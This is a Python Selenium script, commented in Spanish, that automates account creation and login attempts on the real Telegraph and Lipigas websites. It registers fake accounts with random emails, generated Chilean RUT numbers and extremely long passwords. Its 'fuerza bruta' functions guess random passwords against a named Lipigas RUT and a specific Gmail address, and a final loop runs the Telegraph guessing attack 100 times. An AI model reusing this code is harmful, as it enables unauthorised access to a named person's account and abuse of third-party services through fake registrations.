from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
from selenium.webdriver.support.ui import Select


#---------------------- para el generador de mails y passwords -----------------
import random
import string


contador=0

#------------------PARA GENERAR LOS RUTS-------------------

#codigo generador de rut adaptado de https://github.com/Mansilla1/python_rut/blob/master/rut.py
def digito_verificador(rut):
    producto = [2,3,4,5,6,7] # producto de con el cual se debe multiplicar
    list_rut = list(map(int, str(rut))) # convertir en lista el rut
    list_rut.reverse() # revertir los valores
    contador = 0
    pivote = 0
    for i in list_rut:
        if pivote >= len(producto): # si el pivote pasa la cantidad del largo de producto, se debe reiniciar
            pivote = 0
        contador = contador+(i*producto[pivote])
        pivote += 1
    suma_dig = 11-(contador%11) # obtener el resto menos 11 de la suma
    # definir digito verificador
    if suma_dig == 11:
        verificador = 0
    elif suma_dig == 10:
        verificador = 'K'
    else:
        verificador = suma_dig

    return verificador

def generadorRut(y):
  rut=''.join(random.choice(string.digits) for x in range(y))
  digito=str(digito_verificador(rut)) 
  rut= rut+digito
  return rut

#------Genera mails randoms---------
def generadorCaracteresRandom(y):
       return ''.join(random.choice(string.ascii_letters) for x in range(y))

#---------Genera password randoms---------
def generadorPasswords(y):
       return ''.join(random.choice(string.ascii_letters) for x in range(y))



#--------------PARA TELEGRAPH------------
def registerParaTelegraph():
  browser=webdriver.Chrome(executable_path='./chromedriver')
  browser.set_window_size(600,600)
  browser.set_window_position(0,0)
  sleep(2)
  browser.get("https://secure.telegraph.co.uk/customer/secure/register")
  sleep(1)

  #-------------autocompletar email---------------
  mail=str(generadorCaracteresRandom(7)+"@mail.com")
  browser.find_element_by_id("email").send_keys(mail)
  sleep(1)

#-----------autocompletar password-------------
  password=str(generadorPasswords(181)+"12")
  browser.find_element_by_id("password").send_keys(password)
  sleep(1)

  #-----------hacer click en el boton de registrar----------
  browser.find_element_by_css_selector("#gatsby-focus-wrapper > div > div > div > div.form-container-box-content > form > button").click()

  sleep(5)
  browser.close()

def registerParaLipigas():
  browser=webdriver.Chrome(executable_path='./chromedriver')
  browser.set_window_size(600,600)
  browser.set_window_position(0,0)
  sleep(2)
  browser.get("https://sucursal.lipigas.cl/app_sucursal/frontend/usuarios/registro_hogar")
  sleep(1)
#--------------------RUT--------------
  rut=str(generadorRut(7))
  browser.find_element_by_id("rut").send_keys(rut)
  
#------------------nombres----------------
  nombre=str(generadorCaracteresRandom(7))
  browser.find_element_by_id("nombre").send_keys(nombre)
  sleep(1)
#------------------apellido----------------
  apellido=str(generadorCaracteresRandom(7))
  browser.find_element_by_id("apellidos").send_keys(apellido)
  sleep(1)

#-----------------password---------
  password=str(generadorPasswords(4500)+"12")
  browser.find_element_by_id("clave").send_keys(password)
  sleep(1)
  browser.find_element_by_id("clave2").send_keys(password)
  sleep(1)

#------------------telefonos----------------
  telefono=''.join(random.choice(string.digits) for x in range(1,8))
  browser.find_element_by_id("telefono").send_keys(telefono)
  sleep(1)

#------------------mail----------------
  mail=str(generadorCaracteresRandom(7)+"@mail.com")
  browser.find_element_by_id("email").send_keys(mail)
  sleep(1)
  browser.find_element_by_id("r-email").send_keys(mail)
  sleep(2)
  browser.find_element_by_css_selector("body > div.container-general > main > div > div > div > div > form > div.align-center.full-container > ul > li:nth-child(2) > button").click()

  sleep(10)
  browser.close()


#-------------Logins para  intento de adivinar contrasena por fuerza bruta--------------------

def fuerzaBrutaLipigas():
  browser=webdriver.Chrome(executable_path='./chromedriver')
  browser.set_window_size(600,600)
  browser.set_window_position(0,0)
  sleep(2)
  browser.get("https://sucursal.lipigas.cl/app_sucursal/frontend/usuarios/login")
  sleep(1)
  #--------ingreso del campo del rut-----
  rut=str(60053715)
  browser.find_element_by_id("rut").send_keys(rut)
  #rut="60053715"
  #browser.find_element_by_id("rut").send_keys(rut)
  sleep(1)
  #--------ingreso del campo de la contrasena------la contrasena era de largo 15--------
  password=str(generadorPasswords(15))
  browser.find_element_by_id("clave").send_keys(password)
  
  sleep(1)
  browser.find_element_by_css_selector("body > div.container-general > main > div > div > div > div > div > div.row.m-top-50 > div > div:nth-child(2) > div > form > div > button").click()
  sleep(5)
  browser.close()


def fuerzaBrutaTelegraph():
  browser=webdriver.Chrome(executable_path='./chromedriver')
  browser.set_window_size(600,600)
  browser.set_window_position(0,0)
  sleep(2)
  browser.get("https://secure.telegraph.co.uk/customer/secure/login")
  sleep(1)
  
  #--------ingreso del campo del mail-----
  browser.find_element_by_id("email").send_keys("raikos.ch98@gmail.com")
  sleep(1)
  #--------ingreso del campo de la contrasena------el largo actual de la contrasena es de 21--------
  password=str(generadorPasswords(21))
  browser.find_element_by_id("password").send_keys(password)
  sleep(1)
   #-----------hacer click en el boton de ingresar----------
  browser.find_element_by_css_selector("#gatsby-focus-wrapper > div > div > div > div.form-container-box-content > form > div.form-container-box-content-button > button").click()
  sleep(5)
  browser.close()

for i in range(0,100):
  contador+=1
  print(contador)
  fuerzaBrutaTelegraph()